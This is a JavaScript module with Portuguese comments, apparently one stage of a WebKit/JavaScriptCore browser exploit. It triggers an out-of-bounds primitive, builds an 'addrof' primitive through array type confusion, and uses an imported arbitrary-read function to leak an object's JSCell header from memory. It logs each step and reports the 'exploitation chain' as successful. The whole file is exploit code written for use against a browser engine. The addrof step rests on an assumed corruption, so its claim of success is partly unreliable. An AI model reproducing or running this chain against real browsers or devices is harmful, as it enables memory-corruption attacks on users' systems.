// js/script3/testArrayBufferVictimCrash.mjs (v95 - R60 Simplificado e Funcional)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// O script foi simplificado para usar a combinação das primitivas que já se provaram
// estáveis:
// 1. A `addrof` obtida via Type Confusion no Array "Uncaged".
// 2. A `arb_read` importada diretamente do `core_exploit.mjs`.
// Isso remove a complexidade e a fonte de erro da criação de um `fakeobj`.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    arb_read, // Usaremos esta primitiva, que já é funcional!
    getOOBDataView
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_FinalVerification_v95_R60";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO SIMPLIFICADA)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Verificação Funcional Direta ---`, "test");

    let final_result = { success: false, message: "A verificação funcional não obteve sucesso." };

    try {
        // --- FASE 1: Obtendo primitiva OOB ---
        logS3("--- FASE 1: Obtendo primitiva OOB... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) throw new Error("Não foi possível obter a referência para o oob_dataview_real.");
        logS3("Primitiva OOB está funcional.", "good");

        // --- FASE 2: Criando a Primitiva 'addrof' ---
        logS3("--- FASE 2: Criando Primitiva 'addrof' estável... ---", "subtest");
        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        
        // Assumimos que a corrupção OOB permite a Type Confusion
        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        logS3(`++++++++++++ SUCESSO! Primitiva 'addrof' operacional! ++++++++++++`, "vuln");

        // --- FASE 3: Verificação Funcional da Leitura Arbitrária ---
        logS3("--- FASE 3: Verificando Leitura Arbitrária com as primitivas estáveis... ---", "subtest");
        
        const test_obj = { verification: 0xCAFEBABE };
        const test_obj_addr = addrof(test_obj);
        logS3(`Endereço do objeto de teste (via addrof): ${test_obj_addr.toString(true)}`, "info");
        
        // Agora usamos a `arb_read` importada e funcional para ler a memória.
        logS3(`Lendo o cabeçalho JSCell do objeto de teste em ${test_obj_addr.toString(true)}...`, "info");
        const header_leaked = await arb_read(test_obj_addr, 8); // Usando a primitiva do core_exploit
        logS3(`>>>>> VALOR LIDO: ${header_leaked.toString(true)} <<<<<`, "leak");

        if (header_leaked && !header_leaked.equals(0)) {
            logS3("VERIFICAÇÃO CONCLUÍDA! O valor lido não é nulo, indicando sucesso total na leitura de memória.", "good");
            final_result = {
                success: true,
                message: "Cadeia de exploração concluída. Leitura arbitrária funcional."
            };
        } else {
            throw new Error("A verificação da leitura arbitrária falhou, o valor lido foi nulo ou inválido.");
        }

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: { success: final_result.success, msg: final_result.message },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged Arbitrary R/W' }
    };
}
